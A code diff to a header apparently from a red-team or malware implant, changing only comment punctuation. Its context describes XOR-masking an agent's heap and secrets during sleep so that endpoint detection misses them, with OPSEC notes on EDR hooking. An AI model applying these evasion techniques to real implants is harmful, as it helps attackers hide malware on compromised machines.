@@ -1,5 +1,5 @@
 /*
- * mask_heap.h — Sensitive data + heap allocation masking during sleep.
+ * mask_heap.h - Sensitive data + heap allocation masking during sleep.
  *
  * Extends the default XOR masking to also walk the process heap and
  * mask all allocations made by the agent. This catches dynamically
@@ -19,7 +19,7 @@
  * OPSEC:
  *   + Covers all heap-allocated sensitive data (task responses, keys, etc.)
  *   + No VirtualProtect calls (heap is already RW)
- *   + Low overhead — only walks committed heap blocks
+ *   + Low overhead - only walks committed heap blocks
  *   - Does NOT mask the shellcode .text section (use mask_full_image.h for that)
  *   - HeapWalk itself may be hooked by EDR
  *   - Very large heaps slow down mask/unmask cycle
@@ -34,7 +34,7 @@ typedef HANDLE (WINAPI *fn_GetProcessHeap)( void );
 
 /*
  * XOR all BUSY heap blocks with the masking key.
- * Symmetric — call twice to mask/unmask.
+ * Symmetric - call twice to mask/unmask.
  */
 static auto declfn xor_heap_blocks( instance& inst ) -> void {
     auto pGetProcessHeap = reinterpret_cast<fn_GetProcessHeap>(
@@ -74,7 +74,7 @@ static auto declfn xor_heap_blocks( instance& inst ) -> void {
 }
 
 /*
- * evasion_pre_sleep — Mask sensitive fields + all heap blocks.
+ * evasion_pre_sleep - Mask sensitive fields + all heap blocks.
  */
 auto declfn evasion_pre_sleep( instance& inst ) -> void {
     if ( !inst.evasion.ekko.initialized ) return;
@@ -87,7 +87,7 @@ auto declfn evasion_pre_sleep( instance& inst ) -> void {
 }
 
 /*
- * evasion_post_sleep — Unmask heap blocks + sensitive fields.
+ * evasion_post_sleep - Unmask heap blocks + sensitive fields.
  */
 auto declfn evasion_post_sleep( instance& inst ) -> void {
     if ( !inst.evasion.ekko.initialized ) return;
